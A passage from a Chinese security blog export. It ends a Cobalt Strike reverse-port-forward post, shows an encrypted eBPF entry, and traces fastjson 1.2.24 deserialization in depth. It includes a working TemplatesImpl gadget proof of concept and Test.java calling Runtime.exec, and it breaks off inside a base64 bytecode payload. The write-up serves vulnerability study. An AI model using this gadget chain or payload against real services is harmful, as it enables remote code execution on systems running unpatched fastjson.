<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">rportfwd 23333 windows/beacon_reverse_tcp</span><br><span class="line"></span><br><span class="line">Use: rportfwd [bind port] [forward host] [forward port]</span><br><span class="line">     rportfwd stop [bind port]</span><br><span class="line"></span><br><span class="line">Binds the specified port on the target host. When a connection comes in,</span><br><span class="line">Cobalt Strike will make a connection to the forwarded host/port and use Beacon</span><br><span class="line">to relay traffic between the two connections.</span><br></pre></td></tr></table></figure>
<p>比较“奇怪“的是，这个监听器不能在psexec的执行，只能在生成stageless的时候找到<br>
<img src="./1563767495178.png" alt="Alt text"></p>
<p>上线可以看到反向的绿色线，这种方法有个弊端，因为监听的端口往往不是默认放行的端口，所以要求边界机器要关闭防火墙。。。<br>
<img src="./1563768282165.png" alt="Alt text"></p>
<p>ps：reverse同样受到unlink的影响</p>
<h1>参考</h1>
<p><a href="https://mp.weixin.qq.com/s/aCWFlp0AzFd0Ou3wrDVu1g">Cobalt Strike几种不那么常见的上线方式小记</a></p>
]]></content>
      <categories>
        <category>redteam</category>
      </categories>
      <tags>
        <tag>cobaltstrike</tag>
      </tags>
  </entry>
  <entry>
    <title>eBPF基础学习</title>
    <url>/2024/09/14/eBPF%E5%9F%BA%E7%A1%80%E5%AD%A6%E4%B9%A0/</url>
    <content><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">
  <script id="hbeData" type="hbeData" data-hmacdigest="24d53a4ad2096f00be74e8ca564d6c97bfcf057dc4ed1bcac79073ae13ec9f48"></script>
  <div class="hbe hbe-content">
    <div class="hbe hbe-input hbe-input-default">
      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">
      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">
        <span class="hbe hbe-input-label-content hbe-input-label-content-default">Hey, password is required here.</span>
      </label>
    </div>
  </div>
</div>
<script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
      <tags>
        <tag>ebpf</tag>
      </tags>
  </entry>
  <entry>
    <title>fastjson 反序列化流程硬核跟踪</title>
    <url>/2019/10/02/fastjson%20%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%B5%81%E7%A8%8B%E7%A1%AC%E6%A0%B8%E8%B7%9F%E8%B8%AA/</url>
    <content><![CDATA[<!-- fastjson用于将Java Bean序列化为JSON字符串,也可以从JSON字符串反序列化到JavaBean。 -->
<!-- more -->
<h2 id="环境搭建">环境搭建</h2>
<p>pom.xml</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;UTF-8&quot;</span>?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">project</span> <span class="attr">xmlns</span>=<span class="string">&quot;http://maven.apache.org/POM/4.0.0&quot;</span></span></span><br><span class="line"><span class="tag">         <span class="attr">xmlns:xsi</span>=<span class="string">&quot;http://www.w3.org/2001/XMLSchema-instance&quot;</span></span></span><br><span class="line"><span class="tag">         <span class="attr">xsi:schemaLocation</span>=<span class="string">&quot;http://maven.apache.org/POM/4.0.0 http://maven.apache.org/xsd/maven-4.0.0.xsd&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">modelVersion</span>&gt;</span>4.0.0<span class="tag">&lt;/<span class="name">modelVersion</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>com.lisan<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>learnfastjson<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>1.0-SNAPSHOT<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">dependencies</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>com.alibaba<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>fastjson<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">version</span>&gt;</span>1.2.24<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>commons-codec<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>commons-codec<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">version</span>&gt;</span>1.10<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>commons-io<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>commons-io<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">version</span>&gt;</span>2.3<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">dependencies</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">project</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p>Poc.java</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.JSON;</span><br><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.parser.Feature;</span><br><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.parser.ParserConfig;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.io.IOUtils;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.codec.binary.Base64;</span><br><span class="line"><span class="keyword">import</span> java.io.ByteArrayOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.File;</span><br><span class="line"><span class="keyword">import</span> java.io.FileInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Created by web on 2017/4/29.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Poc</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> String <span class="title function_">readClass</span><span class="params">(String cls)</span>&#123;</span><br><span class="line">        <span class="type">ByteArrayOutputStream</span> <span class="variable">bos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            IOUtils.copy(<span class="keyword">new</span> <span class="title class_">FileInputStream</span>(<span class="keyword">new</span> <span class="title class_">File</span>(cls)), bos);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> Base64.encodeBase64String(bos.toByteArray());</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span>  <span class="title function_">test_autoTypeDeny</span><span class="params">()</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">ParserConfig</span> <span class="variable">config</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ParserConfig</span>();</span><br><span class="line">        <span class="keyword">final</span> <span class="type">String</span> <span class="variable">fileSeparator</span> <span class="operator">=</span> System.getProperty(<span class="string">&quot;file.separator&quot;</span>);</span><br><span class="line">        <span class="keyword">final</span> <span class="type">String</span> <span class="variable">evilClassPath</span> <span class="operator">=</span> System.getProperty(<span class="string">&quot;user.dir&quot;</span>) + <span class="string">&quot;/target/classes/Test.class&quot;</span>;</span><br><span class="line">        <span class="type">String</span> <span class="variable">evilCode</span> <span class="operator">=</span> readClass(evilClassPath);</span><br><span class="line">        <span class="keyword">final</span> <span class="type">String</span> <span class="variable">NASTY_CLASS</span> <span class="operator">=</span> <span class="string">&quot;com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl&quot;</span>;</span><br><span class="line">        <span class="type">String</span> <span class="variable">text1</span> <span class="operator">=</span> <span class="string">&quot;&#123;\&quot;@type\&quot;:\&quot;&quot;</span> + NASTY_CLASS +</span><br><span class="line">                <span class="string">&quot;\&quot;,\&quot;_bytecodes\&quot;:[\&quot;&quot;</span>+evilCode+<span class="string">&quot;\&quot;],&#x27;_name&#x27;:&#x27;a.b&#x27;,&#x27;_tfactory&#x27;:&#123; &#125;,\&quot;_outputProperties\&quot;:&#123; &#125;,&quot;</span> +</span><br><span class="line">                <span class="string">&quot;\&quot;_name\&quot;:\&quot;a\&quot;,\&quot;_version\&quot;:\&quot;1.0\&quot;,\&quot;allowedProtocols\&quot;:\&quot;all\&quot;&#125;\n&quot;</span>;</span><br><span class="line">        System.out.println(text1);</span><br><span class="line"></span><br><span class="line">        <span class="type">Object</span> <span class="variable">obj</span> <span class="operator">=</span> JSON.parseObject(text1, Object.class, config, Feature.SupportNonPublicField);</span><br><span class="line">        <span class="comment">//assertEquals(Model.class, obj.getClass());</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String args[])</span>&#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            test_autoTypeDeny();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>Test.java</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">import com.sun.org.apache.xalan.internal.xsltc.DOM;</span><br><span class="line">import com.sun.org.apache.xalan.internal.xsltc.TransletException;</span><br><span class="line">import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;</span><br><span class="line">import com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;</span><br><span class="line">import com.sun.org.apache.xml.internal.serializer.SerializationHandler;</span><br><span class="line">import java.io.IOException;</span><br><span class="line"></span><br><span class="line">public class Test extends AbstractTranslet &#123;</span><br><span class="line">    </span><br><span class="line">    public Test() throws IOException &#123;</span><br><span class="line">        Runtime.getRuntime().exec(&quot;open /Applications/Calculator.app&quot;);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public void transform(DOM document, SerializationHandler[] handlers) throws TransletException &#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public void transform(DOM document, DTMAxisIterator iterator, SerializationHandler handler) throws TransletException &#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public static void main(String[] args) throws Exception &#123;</span><br><span class="line">        Test t = new Test();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="代码跟踪">代码跟踪</h2>
<h3 id="TemplatesImpl-class的寻找">TemplatesImpl.class的寻找</h3>
<p>触发点，一定要传入<code>Feature.SupportNonPublicField</code>否则后面不会为非公有字段添加反序列化器（后面会再提到）<br>
<img src="./1569587047128.png" alt="Alt text"></p>
<p>步入 <code>com.alibaba.fastjson.JSON#parseObject:181</code><br>
<img src="./1569587087142.png" alt="Alt text"></p>
<p>步入 <code>com.alibaba.fastjson.JSON#parseObject:190</code><br>
从全局来看整个反序列化将在下面parseObject进行，其大致顺序是</p>
<ol>
<li>配置反序列化时启用的特性，比如是否允许反序列化非公有字段</li>
<li>获取一个json的词法分析对象parser</li>
<li>用parser分析传入进来的json字符串，进行反序列化。</li>
</ol>
<p><code>/com/alibaba/fastjson/JSON.class:199</code><br>
<img src="./1569940580037.png" alt="Alt text"></p>
<p>先来细看DefaultJSONParser创建过程，先执行类初始化方法（略）。</p>
<p>然后执行对象的构造方法。<br>
<code>/com/alibaba/fastjson/parser/DefaultJSONParser.class:98</code><br>
<img src="./1569120846409.png" alt="Alt text"></p>
<p>执行构造方法的时候又会新建一个JSONScanner类，JSONScanner类的生成同样先是执行类初始化（略）</p>
<p>然后是对象父类的初始化<br>
<img src="./1569121697471.png" alt="Alt text"></p>
<p>子类的初始化<br>
<code>/com/alibaba/fastjson/parser/JSONScanner.class:28</code><br>
<img src="./1569121849067.png" alt="Alt text"></p>
<p>然后回到DefaultJSONParser中执行构造方法，<strong>需要特别说明是初始化的时候将因为传入的json是<code>&#123;</code>开头，所以将token设置为了12，随着词法分析进行token进行会一直改变，token不一样意味着解析接下来json的策略也会变。token与字符的关联关系定义在com.alibaba.fastjson.parser.JSONToken</strong><br>
<code>com.alibaba.fastjson.parser.DefaultJSONParser#DefaultJSONParser</code><br>
<img src="./1569122340408.png" alt="Alt text"></p>
<p>构造方法完成后意味着宏观来看的前两步也完成了，此时拿到词法分析器parser<br>
<code>/com/alibaba/fastjson/JSON.class:203</code><br>
<img src="./1569393851685.png" alt="Alt text"></p>
<p>接着进入从全局来看的最后一步（下面写的所有都是从最后一步展开分析）。调用parser的parseObject方法反序列化json。这里type是在写在Poc中的Object.class，这里的config是在Poc中new的ParserConfig，根据传入的类类型的不同，config会返回不同的反序列化器。<br>
<code>com.alibaba.fastjson.parser.DefaultJSONParser#parseObject:575</code><br>
<img src="./1569941780435.png" alt="Alt text"></p>
<p>先检查传入的type是不是(泛型)数组类型，最后又回到DefaultJSONParser的parser<br>
<code>com.alibaba.fastjson.parser.deserializer.JavaObjectDeserializer.class#deserialze:42</code><br>
<img src="./1569123937120.png" alt="Alt text"></p>
<p>parser方法根据token的不同case到不同分支里面，开始的时候提到了，在创建DefaultJSONParser的时候token设置为了12。<br>
<code>com.alibaba.fastjson.parser.DefaultJSONParser.class#parse:1295</code><br>
<img src="./1569123900016.png" alt="Alt text"><br>
<img src="./1569123997961.png" alt="Alt text"></p>
<p>case 12，主要进行的操作是提去出<code>@type</code>对应的类，并获取到类对象即TemplatesImpl。<br>
<code>com.alibaba.fastjson.parser.DefaultJSONParser#parseObject</code><br>
<img src="./1569136890182.png" alt="Alt text"><br>
<img src="./1569138569725.png" alt="Alt text"></p>
<p>这里将token设置为了16（意味着json合法情况下，下一个符号是逗号）<br>
<img src="./1569396571361.png" alt="Alt text"></p>
<p>根据TemplatesImpl类对象，寻找针对TemplatesImpl的反序列化器，之所以要找新的反序列化器是为了后续反序列化TemplatesImpl的字段。<br>
<img src="./1569396639528.png" alt="Alt text"></p>
<p>找TemplatesImpl.class对应的反序列化器的任务还是委托给config，但是显然config并没有专门对付TemplatesImpl的反序列化器，所以走到了最后一个if条件，即把TemplatesImpl当作一个Java Bean来看并待根据TemplatesImpl实际情况定制一个JavaBeanDeserializer。<br>
<code>com/alibaba/fastjson/parser/ParserConfig.class:411</code><br>
<img src="./1569400686165.png" alt="Alt text"></p>
<h3 id="定制一个的JavaBeanDeserializer来反序列化TemplatesImpl-class">定制一个的JavaBeanDeserializer来反序列化TemplatesImpl.class</h3>
<p>细看一下TemplatesImpl版的JavaBeanDeserializer定制过程。</p>
<p>一来先构建一个beaninfo<br>
<code>com.alibaba.fastjson.parser.ParserConfig.class#createJavaBeanDeserializer:480</code><br>
<img src="./1569946978448.png" alt="Alt text"></p>
<p>beaninfo构建的目的主要是拿到TemplatesImpl满足条件的getter、setter对应的Field和无参构造方法。获取这些办法就是常规的内省操作。<br>
<img src="./1569402342199.png" alt="Alt text"></p>
<p>内省重点是满足条件的getter和setter<br>
<code>com.alibaba.fastjson.util.JavaBeanInfo.class#build:318</code></p>
<ul>
<li>方法名长度大于4 &amp;&amp; 非静态函数 &amp;&amp; 返回类型为void或当前类 &amp;&amp; 参数个数为1个 &amp;&amp; 以set开头<br>
<img src="./1569982590526.png" alt="Alt text"></li>
</ul>
<p><code>com.alibaba.fastjson.util.JavaBeanInfo.class#build:458</code></p>
<ul>
<li>方法名长度大于等于4 &amp;&amp; 非静态方法 &amp;&amp; 以get开头且第4个字母为大写 &amp;&amp; 无参数 &amp;&amp; 返回值类型继承自Collection Map AtomicBoolean AtomicInteger AtomicLong<br>
<img src="./1569983315580.png" alt="Alt text"></li>
</ul>
<p>找到getter setter对应的字段后，会把字段名、字段对应的方法、类对象等打包成fieldInfo并add到FieldList中<br>
<img src="./1569983723950.png" alt="Alt text"></p>
<p>最后用内省拿到的各种东西去构建JavaBeanInfo<br>
<code>com.alibaba.fastjson.util.JavaBeanInfo.class#build:480</code><br>
<img src="./1569511032560.png" alt="Alt text"></p>
<p>构建JavaBeanInfo中有一步中的操作是把FiledInfo排序，排序之后后面要用到FileList的内容直接二分法拿。<br>
<code>com.alibaba.fastjson.util.JavaBeanInfo#JavaBeanInfo:70</code><br>
<img src="./1569511220400.png" alt="Alt text"></p>
<p>JavaBeanInfo构建好会遍历其filedLIst查看是否有getOnly的方法，如果有的话后面就不会用asm的方法创建（对asm不了解，查网上资料是这么说的：获取java bean的属性值，需要调用反射，fastjson引入了asm的来避免反射导致的开销。）这里很不幸，getOutputProperties属于getOnly方法（至于为什么是getOnly简单跟踪一下FiledInfo创建过程就知道了，这里不再展开）<br>
<img src="./1569511346335.png" alt="Alt text"></p>
<p>所以这里最后会用非asm的方法创建JavaBeanDeserializer，用人话说就是直接new JavaBeanDeserializer<br>
<code>com.alibaba.fastjson.parser.deserializer.JavaBeanDeserializer</code><br>
<img src="./1569984381146.png" alt="Alt text"></p>
<p>JavaBeanDeserializer构造方法中又把刚才拿到beaninfo的操作重复了一遍（上面已经跟过了这里也不重复跟踪）。<br>
<code>com.alibaba.fastjson.parser.deserializer.JavaBeanDeserializer.class#JavaBeanDeserializer:50</code><br>
<img src="./1569511793223.png" alt="Alt text"></p>
<p>JavaBeanDeserializer在构造方法中会为每一个Bean字段创建一个反序列化器，并把反序列化器放到sortedFieldDeserializers中<br>
<code>com.alibaba.fastjson.parser.deserializer.JavaBeanDeserializer.class#JavaBeanDeserializer:64</code><br>
<img src="./1569490857135.png" alt="Alt text"></p>
<p>这个反序列化器默认情况下是DeafultFiledDeserializer<br>
<code>com.alibaba.fastjson.parser.ParserConfig.class#createFieldDeserializer:565</code><br>
<img src="./1569491000388.png" alt="Alt text"><br>
<img src="./1569512316826.png" alt="Alt text"><br>
<img src="./1569512351441.png" alt="Alt text"></p>
<p>最后会把JavaBeanDeserializer的Teamplaytesimpl方法到反序列化器的序列中（如果后面其它也要用就不用重新创建一次了）<br>
<img src="./1569487153087.png" alt="Alt text"></p>
<p>至此JavaBeanDeserializer定制完成，下面就开始正式反序列化TemplatesImpl<br>
<img src="./1569569979360.png" alt="Alt text"></p>
<h3 id="JavaBeanDeserializer-deserialze">JavaBeanDeserializer.deserialze</h3>
<p>deserialze往下跟几步会进入label1064，从宏观来看主要的操作都在label1064和其子label中，做了以下这几件事情。</p>
<ol>
<li>创建TemplatesImpl对象</li>
<li>继续读取json字符串内容</li>
<li>用字段的反序列化器把读到内容set到TemplatesImpl对象中<br>
<img src="./1569513241314.png" alt="Alt text"></li>
</ol>
<p>第一步创建TemplatesImpl对象<br>
<code>/com/alibaba/fastjson/parser/deserializer/JavaBeanDeserializer.class:579</code><br>
<img src="./1569513602747.png" alt="Alt text"></p>
<p>第二步根据从json字符串读出的key，反序列化对应字段<br>
<code>/com/alibaba/fastjson/parser/deserializer/JavaBeanDeserializer.class:606</code><br>
<img src="./1569997637825.png" alt="Alt text"><br>
<img src="./1569513780402.png" alt="Alt text"></p>
<p>往下跟的话<strong>之前设置的Feature.SupportNonPublicField.mask在这里就发挥作用了，如果没有这个在TemplatesImpl这条链中_bytecodes因为是私有字段的原因最后就不会被反序列化。</strong><code>SupportNonPublicField</code>选项会把<strong>所有字段</strong>的反序列化器全部生成并放到extraFieldDeserializers中。<br>
<code>com.alibaba.fastjson.parser.DefaultJSONParser:747</code><br>
<img src="./1569592836749.png" alt="Alt text"><br>
<img src="./1569987252636.png" alt="Alt text"></p>
<p>第三步到了最后的时刻，好戏上演。最后一步从局部宏观来看还可再细分为三步<br>
1.获取直接和字段值打交道的反序列化器fieldValueDeserilizer<br>
2.反序列化拿字段对象<br>
3.把字段对象set到object中（如果字段对象的fieldInfo是getOnly，则会反射调用getter方法，从微观来讲RCE问题出在这个地方）<br>
<img src="./1569570858786.png" alt="Alt text"></p>
<p>以_bytecodes为例<br>
第一步 没啥好说的依旧通过config类获取对应的反序列化器<br>
<img src="./1569633321786.png" alt="Alt text"></p>
<p>第二步 fieldValueDeserilizer是ObjectArrayCodec，负责把base64编码解码<br>
<img src="./1569574729954.png" alt="Alt text"><br>
<img src="./1569575532296.png" alt="Alt text"><br>
<img src="./1569575672975.png" alt="Alt text"><br>
<img src="./1569575793082.png" alt="Alt text"></p>
<p>第三步 就是把拿到的值放到TemplatesImpl对象中了<br>
<img src="./1569636061623.png" alt="Alt text"><br>
<img src="./1569636169022.png" alt="Alt text"></p>
<p>_name，_tfactory，_outputProperties的反序列化大同小异</p>
<p>说法在反序列化_outputProperties的时候<br>
<img src="./1569835286521.png" alt="Alt text"></p>
<p>在第三步setValue的时候，因为_outputProperties是getOnly的所以进入不一样的分支，并触发它相应的get方法即getOutputProperties，最后会触发Test的无参数构造方法。<br>
<img src="./1570001070880.png" alt="Alt text"></p>
<p>因为本文主要想描述fastjosn的大致流程，后面和反射部分和fastjson关联性不大了，就不细跟了。不过如果细跟的话就会发现为啥payload是这么构造。（json中看似多余字段为啥要加，为啥要继承AbstractTranslet等等，说白了就是如果不这样进入不了触发无参构造器的分支）。<br>
<img src="./1569837134265.png" alt="Alt text"></p>
<h2 id="杂想">杂想</h2>
<p>弄懂整体流程，弄懂每个大流程下的小流程，弄懂流程之间参数的勾连关系。<br>
从代码上来说，从功能来说。<br>
从大流程上来说，从大流程中小流程来说。<br>
套路或者说定性的规律</p>
<h2 id="附">附</h2>
<h3 id="fastjson的黑名单">fastjson的黑名单</h3>
<p><a href="https://github.com/LeadroyaL/fastjson-blacklist">https://github.com/LeadroyaL/fastjson-blacklist</a></p>
<h3 id="token对应表">token对应表</h3>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/** 1 关联到 error */</span><br><span class="line">public final static int ERROR                = 1;</span><br><span class="line">/** 2 关联到 int */</span><br><span class="line">public final static int LITERAL_INT          = 2;</span><br><span class="line">/** 3 关联到 float */</span><br><span class="line">public final static int LITERAL_FLOAT        = 3;</span><br><span class="line">/** 4 关联到 string */</span><br><span class="line">public final static int LITERAL_STRING       = 4;</span><br><span class="line">/** 5 关联到 iso8601 */</span><br><span class="line">public final static int LITERAL_ISO8601_DATE = 5;</span><br><span class="line">/** 6 关联到 true */</span><br><span class="line">public final static int TRUE                 = 6;</span><br><span class="line">/** 7 关联到 false */</span><br><span class="line">public final static int FALSE                = 7;</span><br><span class="line">/** 8 关联到 null */</span><br><span class="line">public final static int NULL                 = 8;</span><br><span class="line">/** 9 关联到 new */</span><br><span class="line">public final static int NEW                  = 9;</span><br><span class="line">/** 10 关联到 ( */</span><br><span class="line">public final static int LPAREN               = 10;</span><br><span class="line">/** 11 关联到 ) */</span><br><span class="line">public final static int RPAREN               = 11;</span><br><span class="line">/** 12 关联到 &#123; */</span><br><span class="line">public final static int LBRACE               = 12;</span><br><span class="line">/** 13 关联到 &#125; */</span><br><span class="line">public final static int RBRACE               = 13;</span><br><span class="line">/** 14 关联到 [ */</span><br><span class="line">public final static int LBRACKET             = 14;</span><br><span class="line">/** 15 关联到 ] */</span><br><span class="line">public final static int RBRACKET             = 15;</span><br><span class="line">/** 16 关联到 , */</span><br><span class="line">public final static int COMMA                = 16;</span><br><span class="line">/** 17 关联到 : */</span><br><span class="line">public final static int COLON                = 17;</span><br><span class="line">/** 18 关联到 ident */</span><br><span class="line">public final static int IDENTIFIER           = 18;</span><br><span class="line">/** 19 关联到 fieldName */</span><br><span class="line">public final static int FIELD_NAME           = 19;</span><br><span class="line">/** 20 关联到 EOF */</span><br><span class="line">public final static int EOF                  = 20;</span><br><span class="line">/** 21 关联到 Set */</span><br><span class="line">public final static int SET                  = 21;</span><br><span class="line">/** 22 关联到 TreeSet */</span><br><span class="line">public final static int TREE_SET             = 22;</span><br><span class="line">/** 23 关联到 undefined */</span><br><span class="line">public final static int UNDEFINED            = 23; // undefined</span><br><span class="line">/** 24 关联到 ; */</span><br><span class="line">public final static int SEMI                 = 24;</span><br><span class="line">/** 25 关联到 . */</span><br><span class="line">public final static int DOT                  = 25;</span><br><span class="line">/** 26 关联到 hex */</span><br><span class="line">public final static int HEX                  = 26;</span><br></pre></td></tr></table></figure>
<h3 id="payload">payload</h3>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123;&quot;@type&quot;:&quot;com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl&quot;,&quot;_bytecodes&quot;:[&quot;yv66vgAAADEANAoABwAlCgAmACcIACgKACYAKQcAKgoABQAlBwArAQAGPGluaXQ+AQADKClWAQAEQ29kZQEAD0xpbmVOdW1iZXJUYWJsZQEAEkxvY2FsVmFyaWFibGVUYWJsZQEABHRoaXMBAAZMVGVzdDsBAApFeGNlcHRpb25zBwAsAQAJdHJhbnNmb3JtAQByKExjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvRE9NO1tMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9zZXJpYWxpemVyL1NlcmlhbGl6YXRpb25IYW5kbGVyOylWAQAIZG9jdW1lbnQBAC1MY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL0RPTTsBAAhoYW5kbGVycwEAQltMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9zZXJpYWxpemVyL1NlcmlhbGl6YXRpb25IYW5kbGVyOwcALQEApihMY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL0RPTTtMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9kdG0vRFRNQXhpc0l0ZXJhdG9yO0xjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL3NlcmlhbGl6ZXIvU2VyaWFsaXphdGlvbkhhbmRsZXI7KVYBAAhpdGVyYXRvcgEANUxjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL2R0bS9EVE1BeGlzSXRlcmF0b3I7AQAHaGFuZGxlcgEAQUxjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL3NlcmlhbGl6ZXIvU2VyaWFsaXphdGlvbkhhbmRsZXI7AQAEbWFpbgEAFihbTGphdmEvbGFuZy9TdHJpbmc7KVYBAARhcmdzAQATW0xqYXZhL2xhbmcvU3RyaW5nOwEAAXQHAC4BAApTb3VyY2VGaWxlAQAJVGVzdC5qYXZhDAAIAAkHAC8MADAAMQEAIW9wZW4gL0FwcGxpY2F0aW9ucy9DYWxjdWxhdG9yLmFwcAwAMgAzAQAEVGVzdAEAQGNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9ydW50aW1lL0Fic3RyYWN0VHJhbnNsZXQBABNqYXZhL2lvL0lPRXhjZXB0aW9uAQA5Y29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL1RyYW5zbGV0RXhjZXB0aW9uAQATamF2YS9sYW5nL0V4Y2VwdGlvbgEAEWphdmEvbGFuZy9SdW50aW1lAQAKZ2V0UnVudGltZQEAFSgpTGphdmEvbGFuZy9SdW50aW1lOwEABGV4ZWMBACcoTGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL2xhbmcvUHJvY2VzczsAIQAFAAcAAAAAAAQAAQAIAAkAAgAKAAAAQAACAAEAAAAOKrcAAbgAAhIDtgAEV7EAAAACAAsAAAAOAAMAAAAKAAQACwANAAwADAAAAAwAAQAAAA4ADQAOAAAADwAAAAQAAQAQAAEAEQASAAIACgAAAD8AAAADAAAAAbEAAAACAAsAAAAGAAEAAAAQAAwAAAAgAAMAAAABAA0ADgAAAAAAAQATABQAAQAAAAEAFQAWAAIADwAAAAQAAQAXAAEAEQAYAAIACgAAAEkAAAAEAAAAAbEAAAACAAsAAAAGAAEAAAAUAAwAAAAqAAQAAAABAA0ADgAAAAAAAQATABQAAQAAAAEAGQAaAAIAAAABABsAHAADAA8AAAAEAAEAFwAJAB0AHgACAAoAAABBAAIAAgAAAAm7AAVZtwAGTLEAAAACAAsAAAAKAAIAAAAXAAgAGAAMAAAAFgACAAAACQAfACAAAAAIAAEAIQAOAAEADwAAAAQAAQAiAAEAIwAAAAIAJA==&quot;],&#x27;_name&#x27;:&#x27;a.b&#x27;,&#x27;_tfactory&#x27;:&#123; 